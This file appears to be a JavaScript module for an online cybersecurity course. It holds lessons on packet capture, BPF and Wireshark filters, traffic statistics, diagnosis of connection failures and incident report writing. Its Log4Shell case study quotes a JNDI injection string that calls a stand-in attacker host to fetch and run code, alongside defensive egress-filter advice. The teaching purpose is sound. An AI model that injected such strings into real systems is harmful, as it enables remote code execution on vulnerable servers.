// Module 8: Traffic Analysis, Wireshark & Capstone Report
// Comprehensive academic curriculum and telemetry for Course 02
import { module8QuestionBank } from '../quizzes/module8QuestionBank.js';

export const module8Data = {
  id: "mod_c2_m8",
  courseId: "crs_cyber_net_02",
  title: "Module 8: Traffic Analysis, Wireshark & Incident Forensics",
  description: "Master ground-truth packet capture architecture, Berkeley Packet Filters (BPF) versus Wireshark display filters, protocol hierarchy statistics, and macroscopic conversation analysis. Dissect connection failure signatures (timeouts, TCP RST refusals, DNS NXDOMAIN, TLS alerts), triage real-world enterprise incidents (Log4Shell), and compile authoritative network analysis reports.",
  lessonsCount: 6,
  duration: "8 Hours",
  lessons: [
    {
      id: "les_c2_m8_l1",
      title: "8.1 Packet Capture Architecture & Responsible Telemetry",
      duration: "70 mins",
      type: "reading",
      images: [
        {
          id: "img_c2_m8_d1",
          title: "Figure C02-M08-D1: Network Monitoring: Hardware TAP vs Switch SPAN",
          url: "/assets/courses/cyber-02/c02_m8_l1_hardware_tap_vs_switch_span.jpg",
          caption: "Figure C02-M08-D1: Network Monitoring Ingress Points: In-Line Hardware TAP (lossless, zero-latency physical copy) vs. Switch SPAN Port Mirroring (software copy prone to buffer drop under load).",
          alt: "Network monitoring hardware TAP vs switch SPAN port mirroring diagram"
        },
        {
          id: "fig_c02_m08_f1",
          title: "Figure C02-M08-F1: Where Packets Can Be Captured",
          url: "/assets/courses/cyber-02/C02-M08-F1.png",
          caption: "Figure C02-M08-F1: Architectural vantage points for packet capture: local host endpoint, switch mirror port (SPAN), and in-line physical network TAP on perimeter uplink.",
          alt: "Where packets can be captured in enterprise networks diagram"
        }
      ],
      content: `## Packet Capture Architecture, Ingress Points & Responsible Forensics

Logs record only what an application or operating system decided to write; **packet captures reveal the ground truth of what actually traversed the physical and logical wire**. In digital forensics, incident response, and performance engineering, packet analysis represents the ultimate source of network truth.

### 1. Ingress Capture Points & Tap Architecture
A packet capture tool (such as Wireshark, \`tcpdump\`, \`tshark\`, or \`dumpcap\`) interfaces with the operating system kernel driver (e.g. Npcap on Windows, PF_PACKET on Linux) to copy frames from a network interface into a \`.pcap\` or \`.pcapng\` structured file.

![Figure C02-M08-F1: Where Packets Can Be Captured](/assets/courses/cyber-02/C02-M08-F1.png)

*Figure C02-M08-F1: Architectural Vantage Points - Local host endpoint, switch mirror port (SPAN), and in-line physical network TAP on perimeter uplink.*

As mapped in **Figure C02-M08-F1**, packets can be tapped across four distinct architectural vantage points:
1. **On the Local Host Endpoint:**
   - Captures directly from the host's physical or virtual network interface controller (NIC).
   - *Limitation:* Captures only packets entering or leaving that single host.
2. **Switch Mirror Port (SPAN / Switched Port Analyzer):**
   - A managed Layer 2/3 switch copies all traffic crossing designated physical ports or VLANs to a dedicated monitoring port connected to an analyst's workstation or Network Intrusion Detection System (NIDS).
   - *Limitation:* Under extreme traffic saturation, switch ASIC hardware drops mirrored packets to preserve production switching performance.
3. **Passive Hardware Test Access Point (Network TAP):**
   - A dedicated physical inline hardware device spliced directly into the copper or fiber optic transmission line.
   - *Advantage:* Creates an exact physical copy of every photon or electrical wave with zero packet loss, zero latency degradation, and no software configuration vulnerabilities.
4. **Cloud & Container Namespaces:**
   - Cloud Traffic Mirroring (AWS VPC Mirroring, GCP Packet Mirroring) or container network namespace sharing (Docker \`--network container:<target>\`).

![Figure C02-M08-D1: Network Monitoring: Hardware TAP vs Switch SPAN](/assets/courses/cyber-02/c02_m8_l1_hardware_tap_vs_switch_span.jpg)

*Figure C02-M08-D1: Network Monitoring Ingress Points - In-Line Hardware TAP (lossless, zero-latency physical copy) vs. Switch SPAN Port Mirroring (software copy prone to buffer drop under load).*

### 2. Capture Granularity: Full Packet, Snap Length & Flow Records
- **Full Packet Capture (FPC):** Captures the entire Ethernet frame, IP header, transport header, and full application payload. Provides absolute forensic fidelity, but consumes massive disk storage and creates severe data privacy exposure.
- **Snapshot Length (Snaplen):** Truncates packets after the first $N$ bytes (e.g., 96 or 128 bytes). This retains the complete Layer 2, 3, and 4 headers while discarding sensitive application payloads, dramatically shrinking file size.
- **Flow Records (NetFlow / IPFIX / sFlow):** Exports only statistical summaries (5-tuple, start/end timestamps, total packets, total bytes) without saving any packet headers or payloads. Used for macroscopic, long-term network telemetry.

### 3. Ethical, Legal & Cryptographic Chain of Custody
Packet captures frequently contain confidential enterprise data, session cookies, unencrypted passwords, and protected personal information (PII).
- **Explicit Authorized Scope:** Capturing traffic on networks without formal, written administrative authorization is a severe corporate violation and a statutory cybercrime (e.g., Wiretap Act, India's IT Act 2000 / DPDP Act 2023, GDPR).
- **Data Minimization:** Use restrictive capture filters and snap lengths to record only what is required for the investigation.
- **Cryptographic Chain of Custody:** To preserve forensic integrity for legal proceedings, the analyst must compute a cryptographic hash of the capture file immediately upon acquisition:
  \`\`\`powershell
  # Windows PowerShell
  certutil -hashfile rk_c02_trouble.pcap SHA256

  # Linux / macOS
  sha256sum rk_c02_trouble.pcap
  \`\`\``
    },
    {
      id: "les_c2_m8_l2",
      title: "8.2 Capture Filters (BPF) vs. Wireshark Display Filters",
      duration: "75 mins",
      type: "reading",
      images: [
        {
          id: "img_c2_m8_d2",
          title: "Figure C02-M08-D2: Packet Inspection Pipeline: BPF Capture Filter vs Wireshark Display Filter",
          url: "/assets/courses/cyber-02/c02_m8_l2_bpf_capture_vs_display_filter.jpg",
          caption: "Figure C02-M08-D2: Dual-Stage Packet Inspection Pipeline: In-Kernel Libpcap BPF Capture Filters (pre-disk evaluation & discard) vs. User-Space Wireshark Display Filters (non-destructive GUI visualization).",
          alt: "BPF capture filter vs Wireshark display filter packet inspection pipeline diagram"
        },
        {
          id: "fig_c02_m08_f2",
          title: "Figure C02-M08-F2: Capture Filter vs. Display Filter Pipeline",
          url: "/assets/courses/cyber-02/C02-M08-F2.png",
          caption: "Figure C02-M08-F2: Dual-stage packet filtering: Kernel-level BPF capture filters decide what is saved to disk; user-level display filters decide what is shown without altering the capture.",
          alt: "Capture filter versus display filter pipeline diagram"
        }
      ],
      content: `## Capture Filters (BPF) vs. Wireshark Display Filters

![Figure C02-M08-D2: Packet Inspection Pipeline: BPF Capture Filter vs Wireshark Display Filter](/assets/courses/cyber-02/c02_m8_l2_bpf_capture_vs_display_filter.jpg)

*Figure C02-M08-D2: Dual-Stage Packet Inspection - In-Kernel Libpcap BPF Capture Filters (pre-disk evaluation & discard) vs. User-Space Wireshark Display Filters (non-destructive GUI visualization).*

| Feature | Capture Filters (BPF) | Wireshark Display Filters |
| :--- | :--- | :--- |
| **Execution Engine** | Kernel / Libpcap (BPF microcode) | Wireshark Application GUI (User space) |
| **Evaluation Time** | BEFORE saving to disk | AFTER capture file is loaded into memory |
| **Permanent Impact** | Non-matching packets permanently DISCARDED | Never loses data; merely filters visual display |
| **Syntax Style** | BPF (tcpdump primitives) | Granular field-based (e.g., protocol.field) |
| **Example Filter** | \`host 172.30.8.10 and tcp port 443\` | \`ip.addr == 172.30.8.10 && tcp.port == 443\` |

- **Capture Filter (Berkeley Packet Filter - BPF):**
  - Compiled into raw assembly microcode executed directly inside the operating system kernel before packets reach user-space memory.
  - Used to reduce CPU load and prevent disk saturation on busy multi-gigabit links.
  - *Risk:* If your BPF syntax accidentally excludes a critical packet, that evidence is lost forever.
- **Display Filter (Wireshark GUI Engine):**
  - Applied against an already recorded capture file.
  - Provides granular inspection of thousands of dissected protocol fields (e.g. \`http.response.code >= 400\` or \`dns.flags.rcode == 3\`).
  - Safe and non-destructive: changing a display filter simply updates the screen.

![Figure C02-M08-F2: Capture Filter vs. Display Filter Pipeline](/assets/courses/cyber-02/C02-M08-F2.png)

*Figure C02-M08-F2: Dual-Stage Architecture - BPF capture filters decide what is written to the capture file; display filters decide what packets are visualized.*

### 2. Berkeley Packet Filter (BPF) Syntax Primitives
BPF expressions combine primitives with logical operators (\`and\`, \`or\`, \`not\`):
- \`host 172.30.8.10\` : Captures traffic to or from a specific IPv4/IPv6 host.
- \`net 172.30.0.0/24\` : Captures all traffic within a CIDR subnet block.
- \`tcp port 443\` : Captures TCP traffic on port 443.
- \`port 53 or port 67 or port 68\` : Captures all DNS and DHCP transactions.
- \`host 172.30.8.10 and not port 67\` : Captures target host traffic while excluding high-volume local DHCP broadcasts.
- \`icmp\` or \`ip6\` : Restricts capture to specific Layer 3 protocols.

### 3. Wireshark Display Filter Syntax & Operators
Governed by the official \`wireshark-filter\` specification, display filters evaluate structured protocol fields:
- **Comparison Operators:** \`==\` (eq), \`!=\` (ne), \`>\` (gt), \`<\` (lt), \`>=\` (ge), \`<=\` (le).
- **String Matching:** \`contains\` (substring search), \`~=\` (case-insensitive regex match).
- **Logical Connectives:** \`&&\` (and), \`||\` (or), \`!\` (not), \`^^\` (xor).
- **Subnet Matching:** Directly supports CIDR notation (e.g. \`ip.addr == 172.30.0.0/24\`).

> [!CAUTION]
> **The Critical "Not-Equal" Pitfall:** A notorious novice trap in Wireshark is filtering \`ip.addr != 10.0.0.1\`. Because an IP packet possesses *two* addresses (Source and Destination), this filter evaluates to TRUE for any packet where *either* address is not 10.0.0.1 (matching virtually every packet!). The mathematically correct display filter to exclude a host is:
> \`!(ip.addr == 10.0.0.1)\``
    },
    {
      id: "les_c2_m8_l3",
      title: "8.3 Wireshark Display Filters in Applied Incident Triage",
      duration: "75 mins",
      type: "reading",
      images: [
        {
          id: "img_c2_m8_d3",
          title: "Figure C02-M08-D3: Wireshark Packet Analyzer: Three-Pane Protocol Dissection Architecture",
          url: "/assets/courses/cyber-02/c02_m8_l3_wireshark_three_pane_dissection.jpg",
          caption: "Figure C02-M08-D3: Wireshark Three-Pane Protocol Dissection Architecture: Top Packet List with colorized state, middle hierarchical Packet Details tree, and bottom Packet Bytes hex/ASCII inspection highlighting SNI domain payload.",
          alt: "Wireshark three-pane protocol dissection architecture diagram"
        }
      ],
      content: `## Wireshark Display Filters in Applied Incident Triage

Professional SOC analysts do not scroll aimlessly through hundreds of thousands of captured frames; they employ a **Question-Driven Analysis Methodology**. Formulate the investigative hypothesis first, then execute the exact display filter that extracts the forensic proof.

### 1. Essential Display Filter Library for SOC Operations
![Figure C02-M08-D3: Wireshark Packet Analyzer: Three-Pane Protocol Dissection Architecture](/assets/courses/cyber-02/c02_m8_l3_wireshark_three_pane_dissection.jpg)

*Figure C02-M08-D3: Wireshark Three-Pane Protocol Dissection Architecture – Top Packet List with colorized state, middle hierarchical Packet Details tree, and bottom Packet Bytes hex/ASCII inspection highlighting SNI domain payload.*

### 2. Execution-Tested Telemetry on Course Lab Captures
In our verified course laboratory capture (\`rk_c02_lab.pcap\`), executing \`tshark\` with targeted display filters yields immediate answers:

\`\`\`bash
# 1. Isolating HTTP client requests with custom column fields:
$ tshark -r rk_c02_lab.pcap -Y "http.request" -T fields \
         -e frame.number -e ip.src -e http.request.method -e http.request.uri -e http.user_agent

13  172.30.0.20  GET  /         curl/8.23.0
28  172.30.0.21  GET  /nothere  curl/8.23.0

# 2. Extracting application failure responses:
$ tshark -r rk_c02_lab.pcap -Y "http.response.code >= 400" -T fields \
         -e frame.number -e ip.src -e ip.dst -e http.response.code -e http.response.phrase

32  172.30.0.10  172.30.0.21  404  File not found

# 3. Filtering non-ICMP UDP payloads:
$ tshark -r rk_c02_lab.pcap -Y "udp && !icmp" -T fields \
         -e frame.number -e udp.srcport -e udp.dstport -e data.text

48  54156  9999  RK-UDP-TEST
\`\`\`

### 3. Customizing Wireshark GUI Columns
To transform Wireshark from a raw packet list into a rapid analytical dashboard:
1. Locate the target field in the Packet Details pane (e.g. \`dns.qry.name\` or \`tls.handshake.extensions_server_name\`).
2. Right-click the field and select **Apply as Column**.
3. Wireshark instantly renders the domain name or SNI directly in the top summary pane, allowing instant visual triage of thousands of encrypted web sessions without clicking individual packets.

### 4. Timestamp Precision & Log Correlation
By default, Wireshark displays relative time (seconds elapsed since the start of the capture). When correlating network events with Windows Event Logs, Syslog servers, or SIEM timelines, navigate to:
\`View -> Time Display Format -> UTC Date and Time of Day (YYYY-MM-DD HH:MM:SS.mmmmmm)\`.
Ensure all system clocks were synchronized via NTP (Course 22 Module 6).`
    },
    {
      id: "les_c2_m8_l4",
      title: "8.4 Statistics & Macroscopic Telemetry: The Big Picture",
      duration: "70 mins",
      type: "reading",
      content: `## Macroscopic Capture Statistics, Protocol Hierarchies & Endpoints

Before drilling into individual packets, an experienced analyst always steps back to inspect macroscopic statistics. Wireshark's statistical engines provide high-level visibility into network composition, high-volume talkers, protocol anomalies, and temporal spikes.

### 1. Capture File Properties (\`capinfos\`)
Navigating to \`Statistics -> Capture File Properties\` (or running \`capinfos <file.pcap>\` in the terminal) provides baseline metadata:
- Total packet count
- File byte size
- Capture duration (seconds)
- Average data rate (bits/second and packets/second)
- Hardware interface and operating system encapsulation

In our course capture \`rk_c02_lab.pcap\`, the baseline properties show:
\`49 packets, duration 8.580977 seconds, data size 4,757 bytes, captured on Linux virtual bridge interface\`.

### 2. Protocol Hierarchy Statistics
Navigating to \`Statistics -> Protocol Hierarchy\` renders a complete structural tree displaying the exact distribution of traffic across the OSI stack:

\`\`\`
Protocol                               Frames   Bytes   % Frames   % Bytes
--------------------------------------------------------------------------
Ethernet                               49       4757    100.00%    100.00%
  IPv4                                 34       4127     69.39%     86.76%
    TCP                                28       3601     57.14%     75.70%
      HTTP                              4       1643      8.16%     34.54%
      TLS                               1         90      2.04%      1.89%
    ICMP                                5        473     10.20%      9.94%
    UDP                                 1         53      2.04%      1.11%
  ARP                                  15        630     30.61%     13.24%
\`\`\`

#### Forensic Interpretation:
- **ARP Volume:** Notice that 30.61% of all frames are ARP. In a small isolated lab where multiple containers boot simultaneously, initial address resolution dominates. In a production enterprise network, ARP exceeding 10% is an anomaly indicating an ARP scan, loop, or network misconfiguration.
- **TLS Artifacts:** The single TLS frame (90 bytes) represents an unclosed session from an earlier container package update, proving that captures frequently contain background noise that must be filtered out during analysis.

### 3. Conversations & Endpoints Analysis
- **Endpoints (\`Statistics -> Endpoints\`):** Lists every unique Layer 2 MAC, Layer 3 IPv4/IPv6, and Layer 4 TCP/UDP address present in the capture, sorted by transmitted and received packet volume. Instantly reveals unauthorized rogue devices on a subnet.
- **Conversations (\`Statistics -> Conversations\`):** Aggregates traffic between pairs of endpoints:
  \`\`\`
  Endpoint A           Endpoint B           Frames   Bytes   Duration (s)
  -----------------------------------------------------------------------
  172.30.0.20:44460    172.30.0.10:8080     12       1921    0.0013
  172.30.0.21:54762    172.30.0.10:8080     12       1416    0.0012
  \`\`\`
  This answers the foundational investigative question: **"Who talked to whom, how much data was transferred, and for how long-**

### 4. Expert Information & I/O Graphs
- **Expert Information (\`Analyze -> Expert Info\`):** Wireshark automatically audits packets against protocol specifications, grouping anomalies into:
  - *Errors:* Malformed packets, checksum failures.
  - *Warnings:* TCP connection resets (RST), protocol violations.
  - *Notes:* TCP retransmissions, duplicate ACKs, window updates.
  - *Chats:* Normal state transitions (SYN, FIN, HTTP GET).
- **I/O Graphs (\`Statistics -> I/O Graphs\`):** Plots traffic volume over time. A constant, regular rhythm of small spikes (e.g. 50 bytes every 60 seconds) is the unmistakable mathematical signature of an **adversary C2 beacon**.`
    },
    {
      id: "les_c2_m8_l5",
      title: "8.5 Troubleshooting Connection Failures from Packets",
      duration: "75 mins",
      type: "reading",
      images: [
        {
          id: "img_c2_m8_d4",
          title: "Figure C02-M08-D4: TCP Connection Failure: Packet Waterfall & Incident Triage",
          url: "/assets/courses/cyber-02/c02_m8_l5_tcp_connection_failure_waterfall.jpg",
          caption: "Figure C02-M08-D4: Connection Failure Diagnostic Waterfall: Wire signatures distinguishing Firewall DROP/Silent Timeout (repeated SYNs), Closed Port/Firewall REJECT (instant RST/ACK), and Destination Unreachable (ICMP error).",
          alt: "TCP connection failure packet waterfall triage diagram"
        },
        {
          id: "fig_c02_m08_f3",
          title: "Figure C02-M08-F3: Connection Outcomes on the Wire",
          url: "/assets/courses/cyber-02/C02-M08-F3.png",
          caption: "Figure C02-M08-F3: Ground-truth connection outcomes on the wire: Successful TCP 3-way handshake, silent timeout due to firewall drop, instant TCP reset refusal, and DNS NXDOMAIN.",
          alt: "Connection failure wire telemetry outcomes diagram"
        }
      ],
      content: `## Diagnosing Connection Failures: The Four Packet Outcomes

When a user or developer reports that an application "cannot connect," traditional logs rarely explain why. By capturing packets at the boundary, an engineer can categorize the exact failure mode within seconds.

### 1. The Four Fundamental Wire Outcomes
In our dedicated troubleshooting laboratory (\`rk_c02_trouble.pcap\`), a client attempts connections across multiple ports and domain names.

![Figure C02-M08-F3: Connection Outcomes on the Wire](/assets/courses/cyber-02/C02-M08-F3.png)

*Figure C02-M08-F3: Ground-Truth Wire Outcomes - Four diagnostic signatures: Working handshake (8080), silent firewall drop timeout (8081), instant port refusal reset (8082), and DNS NXDOMAIN.*

As cataloged in **Figure C02-M08-F3**, four distinct signatures appear:

#### 1. Port 8080: Successful Connection (Normal Flow)
- **Wire Telemetry:** Client sends TCP \`SYN\` -> Server returns \`SYN/ACK\` -> Client returns \`ACK\` -> HTTP \`GET\` -> Server returns \`HTTP 200 OK\`.
- **Client Perception:** Immediate success; full page rendered in 1.03 ms.

#### 2. Port 8081: Dropped / Timeout (Firewall DROP or Path Severance)
- **Wire Telemetry:**
  \`\`\`
  Frame 17: 172.30.8.20 -> 172.30.8.10  TCP SYN, Dport 8081
  Frame 18: 172.30.8.20 -> 172.30.8.10  TCP Retransmission SYN (+1.02s)
  Frame 19: 172.30.8.20 -> 172.30.8.10  TCP Retransmission SYN (+1.02s)
  Frame 20: 172.30.8.20 -> 172.30.8.10  TCP Retransmission SYN (+1.02s)
  \`\`\`
- **Wire Behavior:** The client transmits a SYN and receives absolute silence. The operating system retransmits the SYN with exponential backoff until the application timer expires.
- **Client Perception:** Application hangs and terminates after 4.0 seconds with \`curl: (28) Operation timed out\`.
- **Root Cause & Fix:** A firewall rule (e.g. \`iptables -P DROP\`) or severed route is silently dropping the packets. The target service is running, but network policy blocks it.

#### 3. Port 8082: Connection Refused (TCP RST / No Listening Daemon)
- **Wire Telemetry:**
  \`\`\`
  Frame 21: 172.30.8.20 -> 172.30.8.10  TCP SYN, Dport 8082
  Frame 22: 172.30.8.10 -> 172.30.8.20  TCP RST, ACK
  \`\`\`
- **Wire Behavior:** The packet reaches the destination operating system. However, no application process is bound or listening to port 8082. The operating system immediately returns a TCP \`RST/ACK\` to reject the connection.
- **Client Perception:** Fails in **0.3 milliseconds** with \`curl: (7) Failed to connect to host; Connection refused\`.
- **Root Cause & Fix:** The network path and firewalls are working correctly; the web server daemon is either stopped, crashed, or misconfigured to listen on a different port.

#### 4. DNS Typo: Non-Existent Domain (NXDOMAIN)
- **Wire Telemetry:**
  \`\`\`
  Frame 25: Query "apps.rk-lab.example" IN A
  Frame 26: Response "apps.rk-lab.example", Rcode: 3 (No such name / NXDOMAIN)
  \`\`\`
- **Root Cause & Fix:** Application configuration contains a spelling error (\`apps\` instead of \`app\`). No IP address exists.

### 2. Comprehensive Diagnostic Matrix
![Figure C02-M08-D4: TCP Connection Failure: Packet Waterfall & Incident Triage](/assets/courses/cyber-02/c02_m8_l5_tcp_connection_failure_waterfall.jpg)

*Figure C02-M08-D4: Connection Failure Diagnostic Waterfall - Wire signatures distinguishing Firewall DROP/Silent Timeout (repeated SYNs), Closed Port/Firewall REJECT (instant RST/ACK), and Destination Unreachable (ICMP error).*`
    },
    {
      id: "les_c2_m8_l6",
      title: "8.6 Compiling a Formal Technical Network Report",
      duration: "80 mins",
      type: "reading",
      content: `## Compiling an Authoritative Technical Network Analysis Report

Technical competence in Wireshark is meaningless if the analyst cannot articulate findings clearly to stakeholders, management, systems engineers, and legal authorities. A formal network analysis report translates packet telemetry into actionable business remediation.

### 1. Structural Blueprint of an Engineering Report
A professional network report must contain eight standard sections:
1. **Executive Summary:** Concise 2-4 sentence non-technical synthesis: what business service was impacted, the definitive root cause discovered, and the required fix.
2. **Scope & Authorization:** Formal record of legal authority: who authorized the capture, the specific interface and time window, and the exact BPF capture filter utilized.
3. **Evidence Integrity:** File names, byte sizes, exact packet counts, UTC timestamps, and the **SHA-256 cryptographic hash** of the capture file.
4. **Methodology:** The hypothesis-driven questions formulated and the corresponding display filters applied.
5. **Technical Findings:** The core evidentiary section. Every finding **must cite exact frame numbers and timestamps**:
   - *Example:* "Frames 17-20 show four consecutive TCP SYN packets from 172.30.8.20 to port 8081 with zero response from 172.30.8.10 over a 4.0-second window."
6. **Separation of Facts vs. Inferences:**
   - *Fact:* "Frame 22 contains a TCP RST from 172.30.8.10."
   - *Inference:* "This indicates that the operating system kernel is active, but no web service daemon is listening on port 8082."
7. **Root Cause & Remediations:** Specific, prioritized recommendations assigned to distinct technical owners.
8. **Limitations & Appendices:** Disclosure of visibility blind spots (e.g. encrypted TLS payloads, switch drops) and full statistical tables.

### 2. Real-World Case Studies

#### Case Study 1: Log4Shell Vulnerability (CVE-2021-44228) & Egress Telemetry
- **The Threat:** In December 2021, the Apache Log4j remote code execution vulnerability was disclosed. When a vulnerable server logged a malicious string (\`\${jndi:ldap://attacker.com/a}\`), the server initiated an outbound LDAP connection to the attacker's server to download and execute arbitrary Java bytecode.
- **CISA Advisory AA21-356A Guidance:** CISA advised organizations to implement strict egress filtering:
  - Block all outbound LDAP (port 389/636) and RMI (port 1099) from internal servers.
  - Restrict outbound DNS port 53 exclusively to authorized internal corporate resolvers.
- **Traffic Analysis Application:** Security analysts applied Wireshark display filters to identify compromised servers:
  \`\`\`
  tcp.flags.syn == 1 && tcp.flags.ack == 0 && (tcp.dstport == 389 || tcp.dstport == 1099)
  \`\`\`
  Any server initiating outbound LDAP proved that exploitation was attempted; whether the 3-way handshake completed proved whether arbitrary code execution succeeded.

#### Case Study 2: Narmada Clinics Performance Triage
- **The Scenario:** Staff at a regional clinic complained that their patient records application became unusable every afternoon at 14:00.
- **The Capture:** With approval, the network team captured 10 minutes of traffic between a workstation and the records server.
- **The Discovery:** Protocol hierarchy and I/O graphs revealed that starting at 14:00, TCP retransmissions surged by 1,200%. Conversations showed that the backup server had been scheduled to execute automated cloud backups over the primary office link during clinic hours.
- **The Fix:** Rescheduling the backup window to 02:00 AM completely restored application latency.

### 3. Practical Hands-On Labs

#### Practical 1: Capturing & Diagnosing Connection Failures
- **Objective:** Execute the troubleshooting container lab (\`rk_c02_troubleshoot_lab.sh\`), inspect \`rk_c02_trouble.pcap\`, identify the frame numbers for working, dropped, and refused ports, and document the root causes.
- **Script:** \`LAB_ASSETS/C02/rk_c02_troubleshoot_lab.sh\`

#### Practical 2: Authoring the Capstone Network Analysis Report
- **Objective:** Utilize the provided enterprise rubric to author a complete, auditable engineering report diagnosing the stock API outage, calculating file SHA-256 hashes, and drafting prioritized remediation tickets.`
    }
  ],
  "quiz": {
    "id": "quiz_mod_c2_8",
    "title": "Module 8 Assessment: Traffic Analysis, Wireshark & Incident Forensics",
    "pass_threshold": 80,
    "total_questions": 20,
    "questions": module8QuestionBank.slice(0, 20).map((q) => ({
      id: q.id,
      question: q.q,
      options: q.options,
      correct_index: q.correct,
      explanation: q.explanation
    }))
  }
};
